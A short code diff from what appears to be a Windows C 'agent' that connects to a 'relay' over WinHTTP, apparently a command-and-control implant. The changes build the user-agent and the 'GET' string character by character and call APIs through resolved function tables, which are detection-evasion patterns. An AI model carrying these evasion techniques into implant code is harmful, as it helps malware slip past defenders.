@@ -109,7 +109,7 @@ static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived)
     LOG_INFO("Connecting to relay %ls...", host);
 
     WCHAR ua_buf[18];
-    StrUserAgent(ua_buf);
+    BuildUserAgent(ua_buf);
     session = winhttp.WinHttpOpen(ua_buf, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
     if (!session) { LOG_ERROR("WinHttpOpen failed (GLE=%lu)", (unsigned long)kernel32.GetLastError()); goto cleanup; }
 
@@ -120,7 +120,7 @@ static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived)
     if (https) request_flags |= WINHTTP_FLAG_SECURE;
 
     WCHAR get_buf[4];
-    StrGetMethodW(get_buf);
+    get_buf[0] = L'G'; get_buf[1] = L'E'; get_buf[2] = L'T'; get_buf[3] = L'\0';
     request = winhttp.WinHttpOpenRequest(connection, get_buf, uc.lpszUrlPath, NULL, NULL, NULL, request_flags);
     if (!request) { LOG_ERROR("WinHttpOpenRequest failed (GLE=%lu)", (unsigned long)kernel32.GetLastError()); goto cleanup; }
 
